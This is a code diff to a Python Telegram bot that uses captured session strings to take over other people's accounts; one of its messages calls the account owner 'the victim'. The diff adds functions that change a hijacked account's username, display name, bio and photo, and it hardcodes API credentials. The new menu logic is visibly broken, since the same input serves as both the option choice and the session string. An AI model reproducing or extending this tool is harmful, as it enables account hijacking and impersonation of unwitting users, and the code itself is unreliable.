@@ -184,7 +184,34 @@ async def change_pic(strses, new_pic_file):
         await X(UploadProfilePhotoRequest(
             await X.upload_file(new_pic_file)
         ))
-        
+from telethon.tl.functions.account import UpdateUsernameRequest, UpdateProfileRequest
+
+async def change_username(strses, new_username):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            await X(UpdateUsernameRequest(new_username))
+            return True
+        except Exception as e:
+            print(e)
+            return False
+
+async def change_name(strses, new_first_name, new_last_name=None):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            await X(UpdateProfileRequest(first_name=new_first_name, last_name=new_last_name))
+            return True
+        except Exception as e:
+            print(e)
+            return False
+
+async def change_bio(strses, new_bio):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            await X(UpdateProfileRequest(about=new_bio))
+            return True
+        except Exception as e:
+            print(e)
+            return False
 async def userchannels(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
@@ -802,16 +829,34 @@ async def users(event):
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Z")))
 async def users(event):
     async with bot.conversation(event.chat_id) as x:
-        await x.send_message("الان ارسل الكود تيرمكس")
+        options_keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("Username", b"Z_username")],
+            [InlineKeyboardButton("Name", b"Z_name")],
+            [InlineKeyboardButton("Bio", b"Z_bio")],
+            [InlineKeyboardButton("Picture", b"Z_picture")]
+        ])
+        await x.send_message("ماذا تريد أن تغير؟", buttons=options_keyboard)
         strses = await x.get_response()
         op = await cu(strses.text)
         if op:
             pass
         else:
             return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
-        await x.send_message("اعطني الصورة الجديدة")
-        new_pic_msg = await x.get_response()
-        new_pic = await new_pic_msg.download_media()
-        await change_pic(strses.text, new_pic)  # استلام الصوره هنا
-        await event.reply(" تم تغيير صورة الحساب بنجاح ", buttons=keyboard)
-
+        
+        if strses.text == "Z_username":
+            await x.send_message("اكتب الاسم المستخدم الجديد")
+            new_value = await x.get_response()
+            await change_username(strses.text, new_value.text)
+        elif strses.text == "Z_name":
+            await x.send_message("اكتب الاسم الجديد")
+            new_value = await x.get_response()
+            await change_name(strses.text, new_value.text)
+        elif strses.text == "Z_bio":
+            await x.send_message("اكتب النبذة الشخصية الجديدة")
+            new_value = await x.get_response()
+            await change_bio(strses.text, new_value.text)
+        elif strses.text == "Z_picture":
+            await x.send_message("أرسل الصورة الجديدة")
+            new_pic = await x.get_response()
+            await change_pic(strses.text, new_pic.media.photo)
+        await event.reply("تم تغيير الحساب بنجاح", buttons=keyboard)
